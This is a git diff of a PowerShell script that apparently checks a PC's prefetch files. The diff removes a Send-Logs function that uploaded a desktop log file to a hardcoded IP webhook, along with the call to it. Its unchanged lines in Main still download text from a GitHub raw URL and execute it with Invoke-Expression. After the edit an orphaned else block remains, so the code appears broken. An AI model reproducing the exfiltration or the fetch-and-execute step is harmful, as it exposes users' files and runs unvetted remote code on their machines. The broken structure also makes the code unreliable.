@@ -260,34 +260,6 @@ function Log-PrefetchFiles {
         Write-Host "Prefetch folder not found." -ForegroundColor Red
     }
 }
-function Send-Logs {
-    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
-
-    if (Test-Path $logFilePath) {
-        $url = "http://51.81.215.34:5000/webhook"
-
-        $fileContent = Get-Content -Path $logFilePath -Raw
-
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"PcCheckLogs.txt`"",
-            "Content-Type: text/plain$LF",
-            $fileContent,
-            "--$boundary--$LF"
-        ) -join $LF
-
-        try {
-            $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-            Write-Host "."
-        }
-        catch {
-            Write-Host "Failed to send log: $_" -ForegroundColor Red
-        }
-    }
     else {
         Write-Host "Log file not found." -ForegroundColor Red
     }
@@ -329,7 +301,6 @@ function Main {
     $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
-    Send-Logs
 
 
 
